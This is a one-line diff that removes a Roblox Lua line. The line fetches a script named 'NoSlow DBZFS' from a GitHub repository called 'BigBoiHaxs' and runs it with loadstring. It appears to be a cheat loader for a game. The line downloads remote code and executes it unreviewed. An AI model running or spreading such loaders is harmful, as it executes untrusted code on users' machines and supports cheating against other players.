@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Extendoze/BigBoiHaxs/main/NoSlow%20DBZFS'),true))()
